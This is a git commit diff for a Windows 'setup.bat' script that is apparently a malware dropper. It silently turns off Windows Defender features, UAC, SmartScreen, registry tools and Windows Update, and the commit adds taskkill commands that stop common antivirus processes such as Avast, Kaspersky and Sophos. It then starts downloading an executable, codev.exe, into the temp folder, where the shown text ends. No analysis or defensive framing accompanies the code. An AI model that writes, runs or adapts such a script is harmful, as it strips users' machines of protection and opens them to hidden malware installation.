47ab8296871646216b861496cd7ce84105e52a84
kuzya09 <160030136+dokinbog@users.noreply.github.com>
2024-06-05 14:54:28 +0300

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -11,36 +11,30 @@ powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
 powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
 powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
 powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableScriptScanning $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
-powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
-powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
-powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
-powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
-powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
-powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
-powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
-powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
-powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
 
 :: Disable UAC (User Account Control)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
 
 :: Disable Windows SmartScreen
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
 
 :: Disable Windows Update
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f > nul 2>&1
+
+:: Stop antivirus processes
+taskkill /f /im avastsvc.exe > nul 2>&1
+taskkill /f /im avastui.exe > nul 2>&1
+taskkill /f /im avguard.exe > nul 2>&1
+taskkill /f /im avira.exe > nul 2>&1
+taskkill /f /im 360tray.exe > nul 2>&1  REM for 360 Total Security
+taskkill /f /im bitdefender.exe > nul 2>&1  REM for Bitdefender
+taskkill /f /im mcafee.exe > nul 2>&1  REM for McAfee
+taskkill /f /im kaspersky.exe > nul 2>&1  REM for Kaspersky
+taskkill /f /im avg.exe > nul 2>&1  REM for AVG
+taskkill /f /im sophos.exe > nul 2>&1  REM for Sophos
+:: Add more taskkill commands for other antivirus processes as needed
 
 :: Download the program
 set "outputFile=%TEMP%\codev.exe"
